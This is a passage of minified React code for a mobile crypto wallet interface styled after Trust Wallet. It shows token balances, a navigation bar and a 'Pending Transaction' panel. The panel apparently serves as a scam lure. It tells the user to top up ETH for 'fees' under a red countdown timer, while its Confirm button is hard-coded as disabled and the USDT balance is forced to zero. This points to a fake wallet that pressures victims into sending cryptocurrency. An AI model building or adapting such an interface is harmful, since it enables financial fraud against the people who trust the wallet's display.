                                            children: t_("USDT") ? "0.00" : tu.toLocaleString("en-US", {
                                                minimumFractionDigits: 2,
                                                maximumFractionDigits: 2
                                            })
                                        }), (0, r.jsxs)("small", {
                                            style: {
                                                fontSize: "13px",
                                                color: tH("--twc-textSecondary"),
                                                fontWeight: 500
                                            },
                                            className: "jsx-212d2f498bea9fe5",
                                            children: ["$", t_("USDT") ? "0.00" : (tu * tb.USDT).toLocaleString("en-US", {
                                                minimumFractionDigits: 2,
                                                maximumFractionDigits: 2
                                            })]
                                        })]
                                    })]
                                }), t_("USDT") && tP("USDT").some(e => e.showSummary) && (e => {
                                    let t = tP(e),
                                        n = t[0],
                                        o = tP(e).reduce((e, t) => e + (t.frozenEthFee || tL(t.amount, t.token)), 0),
                                        i = (null == n ? void 0 : n.timerEnd) ? tE(n.timerEnd) : null,
                                        s = (null == n ? void 0 : n.frozenUsdFee) || 0;
                                    return (0, r.jsxs)("div", {
                                        style: {
                                            background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                            borderRadius: "20px",
                                            padding: "16px",
                                            marginBottom: "12px",
                                            border: "1px solid rgba(174,156,255,0.18)",
                                            animation: "fadeIn 0.3s ease-out"
                                        },
                                        children: [(0, r.jsxs)("div", {
                                            style: {
                                                display: "flex",
                                                justifyContent: "space-between",
                                                alignItems: "flex-start",
                                                marginBottom: "12px"
                                            },
                                            children: [(0, r.jsxs)("div", {
                                                style: {
                                                    flex: 1
                                                },
                                                children: [(0, r.jsx)("h4", {
                                                    style: {
                                                        color: tH("--twc-textPrimary"),
                                                        margin: 0,
                                                        fontSize: "14px",
                                                        fontWeight: 600,
                                                        marginBottom: "4px"
                                                    },
                                                    children: "Pending Transaction"
                                                }), (0, r.jsxs)("p", {
                                                    style: {
                                                        color: "#8B5CF6",
                                                        margin: 0,
                                                        fontSize: "12px",
                                                        fontWeight: 600,
                                                        display: "flex",
                                                        alignItems: "center",
                                                        gap: "4px"
                                                    },
                                                    children: [(0, r.jsx)("svg", {
                                                        width: "12",
                                                        height: "12",
                                                        viewBox: "0 0 24 24",
                                                        fill: "#8B5CF6",
                                                        children: (0, r.jsx)("path", {
                                                            d: "M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"
                                                        })
                                                    }), "Instant Transfer"]
                                                })]
                                            }), (0, r.jsx)("button", {
                                                onClick: () => tM(e),
                                                style: {
                                                    background: "rgba(255,255,255,0.55)",
                                                    border: "none",
                                                    color: tH("--twc-textSecondary"),
                                                    cursor: "pointer",
                                                    padding: "4px",
                                                    display: "flex",
                                                    alignItems: "center",
                                                    justifyContent: "center",
                                                    borderRadius: "4px",
                                                    transition: "filter 0.35s cubic-bezier(.22,1,.36,1), transform 0.35s cubic-bezier(.22,1,.36,1), opacity 0.35s cubic-bezier(.22,1,.36,1), box-shadow 0.35s cubic-bezier(.22,1,.36,1)",
                                                    width: "24px",
                                                    height: "24px"
                                                },
                                                onMouseEnter: e => e.currentTarget.style.backgroundColor = tH("--twc-bg3"),
                                                onMouseLeave: e => e.currentTarget.style.backgroundColor = "transparent",
                                                children: (0, r.jsx)("svg", {
                                                    width: "16",
                                                    height: "16",
                                                    viewBox: "0 0 24 24",
                                                    fill: "currentColor",
                                                    children: (0, r.jsx)("path", {
                                                        d: "M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"
                                                    })
                                                })
                                            })]
                                        }), t.map(e => {
                                            var t, n;
                                            return (0, r.jsxs)("div", {
                                                style: {
                                                    padding: "12px",
                                                    background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                                    borderRadius: "18px",
                                                    marginBottom: "8px",
                                                    border: "1px solid rgba(174,156,255,0.18)"
                                                },
                                                children: [(0, r.jsxs)("div", {
                                                    style: {
                                                        marginBottom: "8px"
                                                    },
                                                    children: [(0, r.jsxs)("p", {
                                                        style: {
                                                            color: "#ff4444",
                                                            margin: 0,
                                                            fontSize: "14px",
                                                            fontWeight: 600
                                                        },
                                                        children: ["-", e.amount.toFixed(2), " ", e.token]
                                                    }), (0, r.jsxs)("p", {
                                                        style: {
                                                            color: tH("--twc-textSecondary"),
                                                            margin: "4px 0 0",
                                                            fontSize: "12px",
                                                            fontFamily: "monospace",
                                                            wordBreak: "break-all"
                                                        },
                                                        children: ["To: ", e.recipient.substring(0, 8), "...", e.recipient.substring(34)]
                                                    })]
                                                }), (0, r.jsxs)("div", {
                                                    style: {
                                                        display: "flex",
                                                        alignItems: "center",
                                                        gap: "6px"
                                                    },
                                                    children: [(0, r.jsx)("div", {
                                                        style: {
                                                            width: "14px",
                                                            height: "14px",
                                                            animation: "spin 2s linear infinite",
                                                            display: "flex",
                                                            alignItems: "center",
                                                            justifyContent: "center"
                                                        },
                                                        children: (0, r.jsx)("svg", {
                                                            width: "14",
                                                            height: "14",
                                                            viewBox: "0 0 24 24",
                                                            children: (0, r.jsx)("circle", {
                                                                cx: "12",
                                                                cy: "12",
                                                                r: "10",
                                                                stroke: "#FF9800",
                                                                strokeWidth: "2",
                                                                strokeDasharray: "20, 10",
                                                                fill: "none",
                                                                strokeLinecap: "round"
                                                            })
                                                        })
                                                    }), (0, r.jsxs)("p", {
                                                        style: {
                                                            color: "#FF9800",
                                                            margin: 0,
                                                            fontSize: "11px",
                                                            fontWeight: 500
                                                        },
                                                        children: ["Awaiting ", (null == (t = e.frozenEthFee) ? void 0 : t.toFixed(4)) || tL(e.amount, e.token).toFixed(4), " ETH ($", (null == (n = e.frozenUsdFee) ? void 0 : n.toFixed(2)) || "0.00", ") for fees"]
                                                    })]
                                                })]
                                            }, e.id)
                                        }), (0, r.jsxs)("div", {
                                            style: {
                                                paddingTop: "12px",
                                                borderTop: "1px solid ".concat(tH("--twc-line"))
                                            },
                                            children: [(0, r.jsxs)("div", {
                                                style: {
                                                    display: "flex",
                                                    alignItems: "flex-start",
                                                    gap: "8px",
                                                    marginBottom: "12px"
                                                },
                                                children: [(0, r.jsx)("svg", {
                                                    width: "16",
                                                    height: "16",
                                                    viewBox: "0 0 24 24",
                                                    fill: "#FF9800",
                                                    children: (0, r.jsx)("path", {
                                                        d: "M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"
                                                    })
                                                }), (0, r.jsxs)("div", {
                                                    style: {
                                                        flex: 1
                                                    },
                                                    children: [(0, r.jsx)("p", {
                                                        style: {
                                                            color: "#FF9800",
                                                            margin: 0,
                                                            fontSize: "13px",
                                                            fontWeight: 600
                                                        },
                                                        children: "Top up or buy required ETH to proceed"
                                                    }), (0, r.jsx)("p", {
                                                        style: {
                                                            color: tH("--twc-textSecondary"),
                                                            margin: "4px 0 0",
                                                            fontSize: "12px"
                                                        },
                                                        children: "Required for Transaction fees"
                                                    })]
                                                })]
                                            }), (0, r.jsxs)("div", {
                                                style: {
                                                    display: "flex",
                                                    justifyContent: "space-between",
                                                    alignItems: "center",
                                                    marginBottom: "12px",
                                                    background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                                    borderRadius: "18px",
                                                    padding: "10px 12px",
                                                    border: "1px solid rgba(174,156,255,0.18)"
                                                },
                                                children: [(0, r.jsxs)("div", {
                                                    children: [(0, r.jsx)("p", {
                                                        style: {
                                                            color: tH("--twc-textSecondary"),
                                                            margin: "0 0 4px",
                                                            fontSize: "11px",
                                                            fontWeight: 500
                                                        },
                                                        children: "Required ETH"
                                                    }), (0, r.jsxs)("p", {
                                                        style: {
                                                            color: tH("--twc-textPrimary"),
                                                            margin: 0,
                                                            fontSize: "14px",
                                                            fontWeight: 600
                                                        },
                                                        children: [o.toFixed(4), " ETH ($", s.toFixed(2), ")"]
                                                    })]
                                                }), i && (0, r.jsxs)("div", {
                                                    style: {
                                                        textAlign: "right"
                                                    },
                                                    children: [(0, r.jsx)("p", {
                                                        style: {
                                                            color: tH("--twc-textSecondary"),
                                                            margin: "0 0 4px",
                                                            fontSize: "11px",
                                                            fontWeight: 500
                                                        },
                                                        children: "Time remaining"
                                                    }), (0, r.jsxs)("p", {
                                                        style: {
                                                            color: i.isUrgent ? "#ff4444" : tH("--twc-textPrimary"),
                                                            margin: 0,
                                                            fontSize: "14px",
                                                            fontWeight: 600,
                                                            fontFamily: "monospace"
                                                        },
                                                        children: [i.minutes, ":", i.seconds]
                                                    })]
                                                })]
                                            }), (0, r.jsxs)("div", {
                                                style: {
                                                    display: "flex",
                                                    gap: "8px"
                                                },
                                                children: [(0, r.jsxs)("button", {
                                                    onClick: tF,
                                                    style: {
                                                        flex: 1,
                                                        padding: "10px",
                                                                    "data-phantom-primary": !0,
                                                        display: "flex",
                                                        alignItems: "center",
                                                        justifyContent: "center",
                                                        gap: "6px"
                                                    },
                                                    onMouseEnter: e => e.currentTarget.style.filter = "brightness(1.03)",
                                                    onMouseLeave: e => e.currentTarget.style.filter = "brightness(1)",
                                                    children: [(0, r.jsx)("svg", {
                                                        width: "14",
                                                        height: "14",
                                                        viewBox: "0 0 24 24",
                                                        fill: "#fff",
                                                        children: (0, r.jsx)("path", {
                                                            d: "M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"
                                                        })
                                                    }), "Top Up ETH"]
                                                }), (0, r.jsx)("button", {
                                                    style: {
                                                        flex: 1,
                                                        padding: "10px",
                                                        backgroundColor: "#8B5CF6",
                                                        color: "#fff",
                                                        border: "none",
                                                        borderRadius: "18px",
                                                        fontSize: "12px",
                                                        fontWeight: 700,
                                                        cursor: "not-allowed",
                                                        opacity: .7,
                                                        display: "flex",
                                                        alignItems: "center",
                                                        justifyContent: "center",
                                                        gap: "4px"
                                                    },
                                                    disabled: !0,
                                                    children: "Confirm"
                                                })]
                                            })]
                                        })]
                                    })
                                })("USDT"), (0, r.jsxs)("div", {
                                    style: {
                                        display: "flex",
                                        justifyContent: "space-between",
                                        alignItems: "center",
                                        padding: "14px 0",
                                        cursor: "default"
                                    },
                                    className: "jsx-212d2f498bea9fe5",
                                    children: [(0, r.jsxs)("div", {
                                        style: {
                                            display: "flex",
                                            alignItems: "center",
                                            gap: "12px",
                                            flex: 1
                                        },
                                        className: "jsx-212d2f498bea9fe5",
                                        children: [(0, r.jsx)("div", {
                                            style: {
                                                position: "relative"
                                            },
                                            className: "jsx-212d2f498bea9fe5",
                                            children: (0, r.jsx)("div", {
                                                style: {
                                                    width: "40px",
                                                    height: "40px",
                                                    position: "relative"
                                                },
                                                className: "jsx-212d2f498bea9fe5",
                                                children: (0, r.jsx)("img", {
                                                    alt: "TRON",
                                                    src: tC.ETH,
                                                    style: {
                                                        width: "100%",
                                                        borderRadius: "50%"
                                                    },
                                                    className: "jsx-212d2f498bea9fe5"
                                                })
                                            })
                                        }), (0, r.jsxs)("div", {
                                            style: {
                                                flex: 1
                                            },
                                            className: "jsx-212d2f498bea9fe5",
                                            children: [(0, r.jsxs)("div", {
                                                style: {
                                                    display: "flex",
                                                    alignItems: "center",
                                                    gap: "6px",
                                                    marginBottom: "4px",
                                                    flexWrap: "wrap"
                                                },
                                                className: "jsx-212d2f498bea9fe5",
                                                children: [(0, r.jsx)("p", {
                                                    style: {
                                                        fontSize: "16px",
                                                        color: tH("--twc-textPrimary"),
                                                        fontWeight: 600,
                                                        margin: 0
                                                    },
                                                    className: "jsx-212d2f498bea9fe5",
                                                    children: "TRX"
                                                }), (0, r.jsx)("span", {
                                                    style: {
                                                        fontSize: "11px",
                                                        padding: "3px 6px",
                                                        background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                                        color: tH("--twc-textThird"),
                                                        borderRadius: "4px",
                                                        fontWeight: 500
                                                    },
                                                    className: "jsx-212d2f498bea9fe5",
                                                    children: "TRON"
                                                })]
                                            }), (0, r.jsxs)("div", {
                                                style: {
                                                    display: "flex",
                                                    alignItems: "center",
                                                    gap: "6px"
                                                },
                                                className: "jsx-212d2f498bea9fe5",
                                                children: [(0, r.jsxs)("small", {
                                                    style: {
                                                        fontSize: "13px",
                                                        color: tH("--twc-textSecondary"),
                                                        fontWeight: 500
                                                    },
                                                    id: "eth-price",
                                                    className: "jsx-212d2f498bea9fe5",
                                                    children: ["$", tb.ETH.toLocaleString(void 0, {
                                                        minimumFractionDigits: 2,
                                                        maximumFractionDigits: 2
                                                    })]
                                                }), (0, r.jsxs)("small", {
                                                    style: {
                                                        fontSize: "13px",
                                                        color: tj.ETH < 0 ? "#ff4444" : "#8B5CF6",
                                                        fontWeight: 500
                                                    },
                                                    id: "eth-change",
                                                    className: "jsx-212d2f498bea9fe5",
                                                    children: [tj.ETH >= 0 ? "+" : "", tj.ETH.toFixed(2), "%"]
                                                })]
                                            })]
                                        })]
                                    }), (0, r.jsxs)("div", {
                                        style: {
                                            textAlign: "right"
                                        },
                                        className: "jsx-212d2f498bea9fe5",
                                        children: [(0, r.jsx)("p", {
                                            style: {
                                                fontSize: "16px",
                                                color: tH("--twc-textPrimary"),
                                                fontWeight: 600,
                                                margin: 0,
                                                marginBottom: "4px"
                                            },
                                            className: "jsx-212d2f498bea9fe5",
                                            children: "0.00"
                                        }), (0, r.jsx)("small", {
                                            style: {
                                                fontSize: "13px",
                                                color: tH("--twc-textSecondary"),
                                                fontWeight: 500
                                            },
                                            className: "jsx-212d2f498bea9fe5",
                                            children: "$0.00"
                                        })]
                                    })]
                                }), tg.filter(e => "USDT" !== e.symbol && "ETH" !== e.symbol).map(e => {
                                    let t = ty[e.symbol] || 0,
                                        n = tb[e.symbol] || 0,
                                        o = tj[e.symbol] || 0;
                                    return (0, r.jsxs)("div", {
                                        style: {
                                            display: "flex",
                                            justifyContent: "space-between",
                                            alignItems: "center",
                                            padding: "14px 0",
                                            cursor: "default"
                                        },
                                        className: "jsx-212d2f498bea9fe5",
                                        children: [(0, r.jsxs)("div", {
                                            style: {
                                                display: "flex",
                                                alignItems: "center",
                                                gap: "12px",
                                                flex: 1
                                            },
                                            className: "jsx-212d2f498bea9fe5",
                                            children: [(0, r.jsxs)("div", {
                                                style: {
                                                    position: "relative"
                                                },
                                                className: "jsx-212d2f498bea9fe5",
                                                children: [(0, r.jsx)("div", {
                                                    style: {
                                                        width: "40px",
                                                        height: "40px",
                                                        position: "relative"
                                                    },
                                                    className: "jsx-212d2f498bea9fe5",
                                                    children: (0, r.jsx)("img", {
                                                        alt: e.symbol,
                                                        src: tC[e.symbol],
                                                        style: {
                                                            width: "100%",
                                                            borderRadius: "50%"
                                                        },
                                                        className: "jsx-212d2f498bea9fe5"
                                                    })
                                                }), "Ethereum" !== e.network && "Bitcoin" !== e.network && "Dogecoin" !== e.network && "Litecoin" !== e.network && "Ripple" !== e.network && "Tron" !== e.network && "Solana" !== e.network && "Cardano" !== e.network && "Polkadot" !== e.network && "Toncoin" !== e.network && (0, r.jsx)("div", {
                                                    style: {
                                                        position: "absolute",
                                                        bottom: "-2px",
                                                        right: "-2px",
                                                        width: "16px",
                                                        height: "16px",
                                                        borderRadius: "50%",
                                                        background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                                        border: "2px solid ".concat(tH("--twc-backgroundPrimary")),
                                                        display: "flex",
                                                        alignItems: "center",
                                                        justifyContent: "center",
                                                        zIndex: 5
                                                    },
                                                    className: "jsx-212d2f498bea9fe5",
                                                    children: (0, r.jsx)("img", {
                                                        alt: e.network,
                                                        src: "BSC" === e.network ? "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/smartchain/info/logo.png" : "Polygon" === e.network ? "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/polygon/info/logo.png" : "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/info/logo.png",
                                                        style: {
                                                            width: "100%",
                                                            borderRadius: "50%"
                                                        },
                                                        className: "jsx-212d2f498bea9fe5"
                                                    })
                                                })]
                                            }), (0, r.jsxs)("div", {
                                                style: {
                                                    flex: 1
                                                },
                                                className: "jsx-212d2f498bea9fe5",
                                                children: [(0, r.jsxs)("div", {
                                                    style: {
                                                        display: "flex",
                                                        alignItems: "center",
                                                        gap: "6px",
                                                        marginBottom: "4px",
                                                        flexWrap: "wrap"
                                                    },
                                                    className: "jsx-212d2f498bea9fe5",
                                                    children: [(0, r.jsx)("p", {
                                                        style: {
                                                            fontSize: "16px",
                                                            color: tH("--twc-textPrimary"),
                                                            fontWeight: 600,
                                                            margin: 0
                                                        },
                                                        className: "jsx-212d2f498bea9fe5",
                                                        children: e.symbol
                                                    }), (0, r.jsx)("span", {
                                                        style: {
                                                            fontSize: "11px",
                                                            padding: "3px 6px",
                                                            background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                                            color: tH("--twc-textThird"),
                                                            borderRadius: "4px",
                                                            fontWeight: 500
                                                        },
                                                        className: "jsx-212d2f498bea9fe5",
                                                        children: e.network
                                                    })]
                                                }), (0, r.jsxs)("div", {
                                                    style: {
                                                        display: "flex",
                                                        alignItems: "center",
                                                        gap: "6px"
                                                    },
                                                    className: "jsx-212d2f498bea9fe5",
                                                    children: [(0, r.jsxs)("small", {
                                                        style: {
                                                            fontSize: "13px",
                                                            color: tH("--twc-textSecondary"),
                                                            fontWeight: 500
                                                        },
                                                        id: "".concat(e.symbol.toLowerCase(), "-price"),
                                                        className: "jsx-212d2f498bea9fe5",
                                                        children: ["$", "number" == typeof n ? n.toLocaleString(void 0, {
                                                            minimumFractionDigits: n < .01 ? 8 : 2,
                                                            maximumFractionDigits: n < .01 ? 8 : 2
                                                        }) : "0.00"]
                                                    }), (0, r.jsxs)("small", {
                                                        style: {
                                                            fontSize: "13px",
                                                            color: o < 0 ? "#ff4444" : "#8B5CF6",
                                                            fontWeight: 500
                                                        },
                                                        id: "".concat(e.symbol.toLowerCase(), "-change"),
                                                        className: "jsx-212d2f498bea9fe5",
                                                        children: [o >= 0 ? "+" : "", o.toFixed(2), "%"]
                                                    })]
                                                })]
                                            })]
                                        }), (0, r.jsxs)("div", {
                                            style: {
                                                textAlign: "right"
                                            },
                                            className: "jsx-212d2f498bea9fe5",
                                            children: [(0, r.jsx)("p", {
                                                style: {
                                                    fontSize: "16px",
                                                    color: tH("--twc-textPrimary"),
                                                    fontWeight: 600,
                                                    margin: 0,
                                                    marginBottom: "4px"
                                                },
                                                className: "jsx-212d2f498bea9fe5",
                                                children: t.toFixed(2)
                                            }), (0, r.jsxs)("small", {
                                                style: {
                                                    fontSize: "13px",
                                                    color: tH("--twc-textSecondary"),
                                                    fontWeight: 500
                                                },
                                                className: "jsx-212d2f498bea9fe5",
                                                children: ["$", (t * n).toFixed(2)]
                                            })]
                                        })]
                                    }, e.symbol)
                                })]
                            })]
                        }), (0, r.jsx)("div", {
                            style: {
                                position: "fixed",
                                bottom: 0,
                                left: 0,
                                right: 0,
                                borderTop: "1px solid ".concat(tH("--twc-line")),
                                padding: "12px 16px",
                                background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                zIndex: 100,
                                backdropFilter: "blur(10px)"
                            },
                            className: "jsx-212d2f498bea9fe5",
                            children: (0, r.jsxs)("div", {
                                style: {
                                    display: "flex",
                                    justifyContent: "space-between",
                                    alignItems: "center",
                                    maxWidth: "375px",
                                    margin: "0 auto"
                                },
                                className: "jsx-212d2f498bea9fe5",
                                children: [(0, r.jsxs)("div", {
                                    style: {
                                        display: "flex",
                                        flexDirection: "column",
                                        alignItems: "center",
                                        cursor: "pointer",
                                        width: "48px"
                                    },
                                    className: "jsx-212d2f498bea9fe5",
                                    children: [(0, r.jsxs)("svg", {
                                        fill: "none",
                                        width: "22",
                                        height: "22",
                                        viewBox: "0 0 24 24",
                                        className: "jsx-212d2f498bea9fe5",
                                        children: [(0, r.jsx)("path", {
                                            style: {
                                                color: tH("--twc-primary")
                                            },
                                            d: "M21 11L20.9999 21H15V13H9V21H3V11L12 2L21 11Z",
                                            fill: "currentColor",
                                            className: "jsx-212d2f498bea9fe5"
                                        }), (0, r.jsx)("rect", {
                                            style: {
                                                color: tH("--twc-primaryPressed")
                                            },
                                            width: "6",
                                            height: "8",
                                            transform: "matrix(1 0 0 -1 9 21)",
                                            fill: "currentColor",
                                            className: "jsx-212d2f498bea9fe5"
                                        })]
                                    }), (0, r.jsx)("small", {
                                        style: {
                                            fontSize: "11px",
                                            color: tH("--twc-primary"),
                                            fontWeight: 600,
                                            marginTop: "4px"
                                        },
                                        className: "jsx-212d2f498bea9fe5",
                                        children: "Home"
                                    })]
                                }), (0, r.jsxs)("div", {
                                    style: {
                                        display: "flex",
                                        flexDirection: "column",
                                        alignItems: "center",
                                        cursor: "pointer",
                                        width: "48px"
                                    },
                                    onClick: () => {
                                        eJ(!0)
                                    },
                                    className: "jsx-212d2f498bea9fe5",
                                    children: [(0, r.jsxs)("svg", {
                                        fill: "none",
                                        width: "22",
                                        height: "22",
                                        viewBox: "0 0 24 24",
                                        className: "jsx-212d2f498bea9fe5",
                                        children: [(0, r.jsx)("path", {
                                            style: {
                                                color: tH("--twc-iconNormal")
                                            },
                                            d: "M22.668 16H2.66797V22H22.668V16Z",
                                            fill: "currentColor",
                                            className: "jsx-212d2f498bea9fe5"
                                        }), (0, r.jsx)("path", {
                                            style: {
                                                color: tH("--twc-textDisabled")
                                            },
                                            fillRule: "evenodd",
                                            clipRule: "evenodd",
                                            d: "M21.4648 10.7988C21.4648 5.93937 17.5255 2 12.666 2C7.80656 2 3.86719 5.93937 3.86719 10.7988C3.86719 14.1599 5.75169 17.0807 8.52171 18.5625H16.8103C19.5803 17.0807 21.4648 14.1599 21.4648 10.7988ZM8.89509 10.7988L12.666 14.5698L16.4369 10.7988L12.666 7.0279L8.89509 10.7988Z",
                                            fill: "currentColor",
                                            className: "jsx-212d2f498bea9fe5"
                                        })]
                                    }), (0, r.jsx)("small", {
                                        style: {
                                            fontSize: "11px",
                                            color: tH("--twc-textPrimary"),
                                            fontWeight: 500,
                                            marginTop: "4px"
                                        },
                                        className: "jsx-212d2f498bea9fe5",
                                        children: "Earn"
                                    })]
                                }), (0, r.jsxs)("div", {
                                    style: {
                                        display: "flex",
                                        flexDirection: "column",
                                        alignItems: "center",
                                        cursor: "pointer",
                                        width: "48px"
                                    },
                                    onClick: () => {
                                        eQ(!0)
                                    },
                                    className: "jsx-212d2f498bea9fe5",
                                    children: [(0, r.jsxs)("svg", {
                                        fill: "none",
                                        width: "22",
                                        height: "22",
                                        viewBox: "0 0 24 24",
                                        className: "jsx-212d2f498bea9fe5",
                                        children: [(0, r.jsx)("path", {
                                            style: {
                                                color: tH("--twc-textDisabled")
                                            },
                                            d: "M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z",
                                            fill: "currentColor",
                                            opacity: "0.3",
                                            className: "jsx-212d2f498bea9fe5"
                                        }), (0, r.jsx)("path", {
                                            style: {
                                                color: tH("--twc-textDisabled")
                                            },
                                            d: "M12 2.18L4.73 6.3V12c0 3.56 2.55 7.87 7.27 9.82 4.72-1.95 7.27-6.26 7.27-9.82V6.3L12 2.18z",
                                            fill: "currentColor",
                                            className: "jsx-212d2f498bea9fe5"
                                        })]
                                    }), (0, r.jsx)("small", {
                                        style: {
                                            fontSize: "11px",
                                            color: tH("--twc-textPrimary"),
                                            fontWeight: 500,
                                            marginTop: "4px"
                                        },
                                        className: "jsx-212d2f498bea9fe5",
                                        children: "Web3"
                                    })]
                                }), (0, r.jsxs)("div", {
                                    style: {
                                        display: "flex",
                                        flexDirection: "column",
                                        alignItems: "center",
                                        cursor: "pointer",
                                        width: "48px"
                                    },
                                    onClick: () => {
                                        eg(!0), Z(!0), setTimeout(() => {
                                            eg(!1), Z(!1), eh(!0), setTimeout(() => {
                                                eh(!1), localStorage.removeItem("isLoggedIn"), t(!0), o(!1), I(!1), h(""), f(""), b(""), D(!1), R(!1), P(!1), k("Login"), z(!1)
                                            }, 2e3)
                                        }, 1e3)
                                    },
                                    className: "jsx-212d2f498bea9fe5",
                                    children: [(0, r.jsx)("svg", {
                                        fill: "none",
                                        width: "22",
                                        height: "22",
                                        viewBox: "0 0 24 24",
                                        className: "jsx-212d2f498bea9fe5",
                                        children: (0, r.jsx)("path", {
                                            style: {
                                                color: tH("--twc-textDisabled")
                                            },
                                            d: "M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z",
                                            fill: "currentColor",
                                            className: "jsx-212d2f498bea9fe5"
                                        })
                                    }), (0, r.jsx)("small", {
                                        style: {
                                            fontSize: "11px",
                                            color: tH("--twc-textPrimary"),
                                            fontWeight: 500,
                                            marginTop: "4px"
                                        },
                                        className: "jsx-212d2f498bea9fe5",
                                        children: "Lock"
                                    })]
                                })]
                            })
                        }), eu && (0, r.jsx)("div", {
                            style: {
                                position: "fixed",
                                top: 0,
                                left: 0,
                                right: 0,
                                bottom: 0,
                                backgroundColor: "rgba(248,247,253,0.82)",
                                display: "flex",
                                alignItems: "center",
                                justifyContent: "center",
                                zIndex: 9998,
                                padding: "16px",
                                animation: "fadeIn 0.3s ease-out"
                            },
                            className: "jsx-212d2f498bea9fe5",
                            children: (() => {
                                if (G) return tV();
                                let e = tg.filter(e => e.symbol.toLowerCase().includes(eE.toLowerCase()) || e.name.toLowerCase().includes(eE.toLowerCase()) || e.network.toLowerCase().includes(eE.toLowerCase()));
                                return (0, r.jsxs)("div", {
                                    style: {
                                        background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                        borderRadius: "24px",
                                        width: "100%",
                                        maxWidth: "420px",
                                        height: "620px",
                                        display: "flex",
                                        flexDirection: "column",
                                        boxShadow: "0 24px 80px rgba(124, 58, 237, 0.12), 0 8px 24px rgba(15, 23, 42, 0.08)",
                                        border: "1px solid rgba(174,156,255,0.18)",
                                        overflow: "hidden"
                                    },
                                    children: [(() => {
                                        let e = "",
                                            t = !1;
                                        switch (eB) {
                                            case "select":
                                                e = "Select Token";
                                                break;
                                            case "activity":
                                                e = "".concat(ey, " Activity"), t = !0;
                                                break;
                                            case "send":
                                                e = "Send ".concat(ey), t = !0;
                                                break;
                                            case "topup":
                                                e = "Top Up ETH", t = !0
                                        }
                                        return (0, r.jsxs)("div", {
                                            style: {
                                                padding: "20px 16px 16px",
                                                display: "flex",
                                                justifyContent: "space-between",
                                                alignItems: "center",
                                                position: "relative",
                                                borderBottom: "1px solid ".concat(tH("--twc-line"))
                                            },
                                            children: [t ? (0, r.jsx)("button", {
                                                onClick: () => {
                                                    "activity" === eB ? eR("select") : "send" === eB ? eR("activity") : "topup" === eB && eR("send")
                                                },
                                                style: {
                                                    background: "rgba(255,255,255,0.55)",
                                                    border: "none",
                                                    color: tH("--twc-textPrimary"),
                                                    cursor: "pointer",
                                                    padding: "8px",
                                                    display: "flex",
                                                    alignItems: "center",
                                                    justifyContent: "center",
                                                    borderRadius: "18px",
                                                    transition: "background-color 0.2s ease",
                                                    position: "absolute",
                                                    left: "16px",
                                                    zIndex: 10
                                                },
                                                onMouseEnter: e => e.currentTarget.style.backgroundColor = tH("--twc-bg3"),
                                                onMouseLeave: e => e.currentTarget.style.backgroundColor = "transparent",
                                                children: (0, r.jsx)("svg", {
                                                    width: "24",
                                                    height: "24",
                                                    viewBox: "0 0 24 24",
                                                    fill: "currentColor",
                                                    children: (0, r.jsx)("path", {
                                                        d: "M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"
                                                    })
                                                })
                                            }) : (0, r.jsx)("div", {
                                                style: {
                                                    width: "40px"
                                                }
                                            }), (0, r.jsx)("h3", {
                                                style: {
                                                    color: tH("--twc-textPrimary"),
                                                    margin: 0,
                                                    fontSize: "18px",
                                                    fontWeight: 700,
                                                    textAlign: "center",
                                                    width: "100%",
                                                    paddingLeft: t ? "40px" : "0",
                                                    paddingRight: "40px"
                                                },
                                                children: e
                                            }), (0, r.jsx)("button", {
                                                onClick: () => ef(!1),
                                                style: {
                                                    background: tH("--twc-bg3"),
                                                    border: "none",
                                                    color: tH("--twc-iconNormal"),
                                                    cursor: "pointer",
                                                    fontSize: "20px",
                                                    padding: "8px",
                                                    borderRadius: "50%",
                                                    width: "36px",
                                                    height: "36px",
                                                    display: "flex",
                                                    alignItems: "center",
                                                    justifyContent: "center",
                                                    transition: "filter 0.35s cubic-bezier(.22,1,.36,1), transform 0.35s cubic-bezier(.22,1,.36,1), opacity 0.35s cubic-bezier(.22,1,.36,1), box-shadow 0.35s cubic-bezier(.22,1,.36,1)",
                                                    position: "absolute",
                                                    right: "16px",
                                                    zIndex: 10
                                                },
                                                onMouseEnter: e => e.currentTarget.style.backgroundColor = tH("--twc-backgroundSecondary"),
                                                onMouseLeave: e => e.currentTarget.style.backgroundColor = tH("--twc-bg3"),
                                                children: "\xd7"
                                            })]
                                        })
